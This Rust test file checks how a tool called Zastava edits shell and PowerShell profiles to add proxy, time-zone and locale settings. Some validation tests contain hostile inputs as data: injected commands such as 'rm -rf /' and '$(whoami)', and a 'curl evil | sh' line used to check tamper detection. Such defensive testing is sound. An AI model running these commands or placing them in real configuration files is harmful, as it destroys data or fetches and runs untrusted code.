use super::*;

#[test]
fn test_upsert_shell_rc_idempotent() {
    let initial = "export PATH=\"$HOME/.local/bin:$PATH\"\n";
    let updated1 = upsert_shell_rc_content(initial, "http://127.0.0.1:8899", 8899);
    assert!(updated1.contains("nc -z 127.0.0.1 8899"));
    assert!(updated1.contains("export HTTPS_PROXY=\"http://127.0.0.1:8899\""));

    // Second upsert with fallback port 8900 replaces the block without duplicating it
    let updated2 = upsert_shell_rc_content(&updated1, "http://127.0.0.1:8900", 8900);
    assert_eq!(updated2.matches(ZASTAVA_RC_START).count(), 1);
    assert!(updated2.contains("nc -z 127.0.0.1 8900"));
    assert!(!updated2.contains("127.0.0.1:8899"));

    let removed = remove_shell_rc_block(&updated2);
    assert!(!removed.contains(ZASTAVA_RC_START));
    assert!(!removed.contains(ZASTAVA_RC_END));
    assert!(removed.contains("export PATH="));
}

#[test]
fn test_shell_rc_with_timezone() {
    let initial = "export PATH=\"$HOME/bin:$PATH\"\n";
    let updated = upsert_shell_rc_content_with_tz(
        initial,
        "http://127.0.0.1:8899",
        8899,
        Some("Europe/London"),
    );
    assert!(updated.contains("export TZ=\"Europe/London\""));
    assert!(updated.contains("export LANG=\"en_US.UTF-8\""));
    assert!(updated.contains("export LC_TIME=\"en_US.UTF-8\""));
    assert!(!updated.contains("LC_ALL"), "LC_ALL is never exported");
    assert!(updated.contains("export HTTPS_PROXY=\"http://127.0.0.1:8899\""));
}

#[test]
fn test_sanitize_timezone() {
    assert_eq!(
        sanitize_timezone("Europe/London"),
        Some("Europe/London".to_string())
    );
    assert_eq!(
        sanitize_timezone(" America/New_York "),
        Some("America/New_York".to_string())
    );
    assert_eq!(
        sanitize_timezone("Etc/GMT+3"),
        Some("Etc/GMT+3".to_string())
    );
    assert_eq!(sanitize_timezone(""), None);
    assert_eq!(sanitize_timezone("   "), None);
    assert_eq!(sanitize_timezone("Europe/Berlin; rm -rf /"), None);
    assert_eq!(sanitize_timezone("$(whoami)"), None);
}

#[test]
fn test_powershell_profile_with_timezone() {
    let initial = "# Custom powershell user settings\nWrite-Host 'Welcome'\n";
    let updated = upsert_powershell_profile_content_with_tz(
        initial,
        "http://127.0.0.1:8899",
        Some("Europe/Warsaw"),
    );
    assert!(updated.contains("$__zastavaUp"));
    assert!(updated.contains("GetActiveTcpListeners()"));
    assert!(updated.contains("Port -eq 8899"));
    assert!(updated.contains("$env:HTTP_PROXY = \"http://127.0.0.1:8899\""));
    assert!(updated.contains("$env:TZ = \"Europe/Warsaw\""));
    assert!(updated.contains("$env:LANG = \"en_US.UTF-8\""));
    assert!(updated.contains("$env:LC_TIME = \"en_US.UTF-8\""));
    // A closed Zastava must never wipe the user's own variables from the session.
    assert!(!updated.contains("Remove-Item"));
    assert!(!updated.contains("else"));
    assert!(updated.contains(ZASTAVA_RC_START));
    assert!(updated.contains(ZASTAVA_RC_END));

    // Idempotent upsert replaces block
    let updated2 = upsert_powershell_profile_content_with_tz(
        &updated,
        "http://127.0.0.1:8900",
        Some("Europe/Berlin"),
    );
    assert_eq!(updated2.matches(ZASTAVA_RC_START).count(), 1);
    assert!(updated2.contains("Port -eq 8900"));
    assert!(updated2.contains("http://127.0.0.1:8900"));
    assert!(updated2.contains("Europe/Berlin"));
    assert!(!updated2.contains("Europe/Warsaw"));

    // Cleanup removes block
    let cleaned = remove_shell_rc_block(&updated2);
    assert!(!cleaned.contains(ZASTAVA_RC_START));
    assert!(!cleaned.contains("Europe/Berlin"));
    assert!(cleaned.contains("Write-Host 'Welcome'"));
}

// --- exact markers, byte-exact edits -----------------------------------------------------

fn block() -> String {
    build_shell_rc_guard_block_with_tz("http://127.0.0.1:8899", 8899, None)
}

#[test]
fn find_block_needs_the_exact_marker_lines() {
    let b = block();
    assert_eq!(find_block("export A=1\n").unwrap(), None);
    let t = format!("export A=1\n\n{b}\nafter\n");
    let r = find_block(&t).unwrap().unwrap();
    assert_eq!(&t[r], b);
    // BOM on the first line and CRLF line ends do not hide the markers.
    let bom = format!("\u{feff}{}\r\nx\r\n", b.replace('\n', "\r\n"));
    let r = find_block(&bom).unwrap().unwrap();
    assert_eq!(r.start, 3);
    assert!(bom[r].starts_with(ZASTAVA_RC_START) && bom.contains(ZASTAVA_RC_END));
    for bad in [
        format!("{ZASTAVA_RC_START}\n"),
        format!("{ZASTAVA_RC_END}\n"),
        format!("{ZASTAVA_RC_END}\n{ZASTAVA_RC_START}\n"),
        format!("{b}\n{b}\n"),
        format!("echo '{ZASTAVA_RC_START}'\n{b}\n"),
        format!("  {ZASTAVA_RC_START}\nx\n{ZASTAVA_RC_END}\n"),
    ] {
        assert_eq!(find_block(&bad), Err(BlockAmbiguous), "{bad}");
    }
}

#[test]
fn upsert_replaces_in_place_and_remove_returns_the_original_bytes() {
    let user = "export PATH=\"$HOME/bin:$PATH\"\n# trailing comment\n";
    let once = upsert_block(user, &block()).unwrap();
    assert!(once.starts_with(user));
    let twice = upsert_block(&once, &block()).unwrap();
    assert_eq!(once, twice, "same block: the file is the same");
    let after = format!("{once}alias g=git\n");
    let moved = upsert_block(
        &after,
        &build_shell_rc_guard_block_with_tz("http://127.0.0.1:8900", 8900, None),
    )
    .unwrap();
    assert!(
        moved.ends_with("alias g=git\n"),
        "text after the block is not touched"
    );
    assert!(moved.starts_with(user));
    assert_eq!(remove_block(&once).unwrap(), user);
    assert_eq!(
        remove_block(&after).unwrap(),
        format!("{user}alias g=git\n")
    );
    assert_eq!(remove_block(user).unwrap(), user);
}

fn guard(port: u16) -> String {
    build_shell_rc_guard_block_with_tz(&format!("http://127.0.0.1:{port}"), port, None)
}

#[test]
fn a_profile_without_a_final_line_end_comes_back_byte_for_byte() {
    for user in [
        "alias g=git",
        "alias g=git\nexport A=1",
        "alias g=git\r\nexport A=1",
        "alias g=git  ",
        "\u{feff}alias g=git",
        " ",
    ] {
        let once = upsert_block(user, &guard(8899)).unwrap();
        assert!(once.starts_with(user));
        assert!(find_block(&once).unwrap().is_some());
        assert_eq!(remove_block(&once).unwrap(), user, "{user:?}");
        // A second upsert replaces the block in place and keeps the open last line.
        let twice = upsert_block(&once, &guard(8900)).unwrap();
        assert_eq!(twice.matches(ZASTAVA_RC_START).count(), 1);
        assert!(!twice.ends_with('\n'), "{twice:?}");
        assert_eq!(remove_block(&twice).unwrap(), user, "{user:?}");
    }
    // With and without the final line end are different files and stay different.
    let with_eol = upsert_block("alias g=git\n", &guard(8899)).unwrap();
    let without = upsert_block("alias g=git", &guard(8899)).unwrap();
    assert_ne!(with_eol, without);
    assert_eq!(remove_block(&with_eol).unwrap(), "alias g=git\n");
}

#[test]
fn every_small_profile_round_trips_with_either_kind_of_line_end() {
    // All texts of up to 5 pieces; one kind of line end per file (the block follows it).
    for nl in ["\n", "\r\n"] {
        let pieces = ["a", " ", nl];
        let mut texts = vec![String::new()];
        let mut frontier = vec![String::new()];
        for _ in 0..5 {
            let mut next = Vec::new();
            for t in &frontier {
                for p in pieces {
                    next.push(format!("{t}{p}"));
                }
            }
            texts.extend(next.iter().cloned());
            frontier = next;
        }
        for user in texts {
            for bom in ["", "\u{feff}"] {
                let user = format!("{bom}{user}");
                let once = upsert_block(&user, &guard(8899)).unwrap();
                assert_eq!(remove_block(&once).unwrap(), user, "{user:?}");
            }
        }
    }
}

#[test]
fn pure_wrappers_return_an_ambiguous_profile_unchanged() {
    let broken = format!("a\n{ZASTAVA_RC_START}\nb\n");
    assert_eq!(
        upsert_shell_rc_content(&broken, "http://127.0.0.1:8899", 8899),
        broken
    );
    assert_eq!(remove_shell_rc_block(&broken), broken);
    assert_eq!(
        upsert_powershell_profile_content_with_tz(&broken, "127.0.0.1:8899", None),
        broken
    );
}

#[test]
fn generated_blocks_are_recognised_and_edited_ones_are_not() {
    let url = "http://127.0.0.1:8899";
    assert!(is_generated_block(&block()));
    assert!(is_generated_block(&build_shell_rc_guard_block_with_tz(
        url,
        8899,
        Some("Europe/Berlin")
    )));
    assert!(is_generated_block(&build_powershell_guard_block_with_tz(
        url,
        Some("Asia/Tokyo")
    )));
    assert!(is_generated_block(&block().replace('\n', "\r\n")));
    let edited = block().replace(
        "  export NO_PROXY=",
        "  export MY_OWN=1\n  export NO_PROXY=",
    );
    assert!(!is_generated_block(&edited));
    let corp = block().replace(
        "export HTTPS_PROXY=\"http://127.0.0.1:8899\"",
        "export HTTPS_PROXY=\"http://corp:3128\"",
    );
    assert!(!is_generated_block(&corp));
    let injected = block().replace("fi\n", "fi\ncurl evil | sh\n");
    assert!(!is_generated_block(&injected));
    assert!(!is_generated_block(ZASTAVA_RC_START));
}

#[test]
fn powershell_paths_come_from_the_given_home() {
    let paths = powershell_profile_paths(Path::new("/h"));
    assert_eq!(paths.len(), 2);
    assert!(paths.iter().all(|p| p.starts_with("/h/Documents")));
}

#[test]
fn shell_block_parts_are_independent_and_never_export_lc_all() {
    let url = "http://127.0.0.1:8899";
    let both = build_shell_block(8899, Some(url), Some("Europe/Berlin"));
    let proxy = build_shell_block(8899, Some(url), None);
    let tz = build_shell_block(8899, None, Some("Europe/Berlin"));
    let none = build_shell_block(8899, None, None);
    assert!(both.contains("HTTPS_PROXY") && both.contains("export TZ="));
    assert!(proxy.contains("HTTPS_PROXY") && !proxy.contains("TZ") && !proxy.contains("LANG"));
    assert!(!tz.contains("PROXY") && !tz.contains("proxy") && tz.contains("export LC_TIME="));
    assert!(!none.contains("export"));
    for b in [&both, &proxy, &tz, &none] {
        assert!(!b.contains("LC_ALL"), "{b}");
        assert!(is_generated_block(b), "{b}");
    }
    // The block guards on the gateway port also without a proxy part.
    assert!(tz.contains("nc -z 127.0.0.1 8899"));
    // A time zone that is not a zone name is not exported.
    assert!(!build_shell_block(8899, None, Some("Europe/Berlin; rm -rf /")).contains("TZ"));
}

#[test]
fn powershell_block_writes_locale_variables_only_with_a_zone() {
    let url = "http://127.0.0.1:8899";
    let proxy_only = build_powershell_guard_block_with_tz(url, None);
    assert!(proxy_only.contains("$env:HTTPS_PROXY"));
    for var in ["LANG", "LC_TIME", "TZ", "LC_ALL"] {
        assert!(!proxy_only.contains(var), "{var}");
    }
    let with_tz = build_powershell_guard_block_with_tz(url, Some("Asia/Tokyo"));
    assert!(with_tz.contains("$env:TZ = \"Asia/Tokyo\""));
    assert!(with_tz.contains("$env:LANG = \"en_US.UTF-8\""));
    assert!(with_tz.contains("$env:LC_TIME = \"en_US.UTF-8\""));
    assert!(!with_tz.contains("LC_ALL"));
    assert!(is_generated_block(&proxy_only) && is_generated_block(&with_tz));
}

#[test]
fn a_block_of_2_0_0_with_lc_all_is_still_recognised_for_removal_and_a_foreign_locale_is_not() {
    let url = "http://127.0.0.1:8899";
    let old = build_shell_rc_guard_block_with_tz(url, 8899, Some("Asia/Tokyo")).replace(
        "  export LC_TIME=\"en_US.UTF-8\"",
        "  export LC_TIME=\"en_US.UTF-8\"\n  export LC_ALL=\"en_US.UTF-8\"",
    );
    assert!(is_generated_block(&old));
    let user_locale = old.replace("LC_ALL=\"en_US.UTF-8\"", "LC_ALL=\"ru_RU.UTF-8\"");
    assert!(
        !is_generated_block(&user_locale),
        "a foreign locale value is not Zastava's"
    );
}
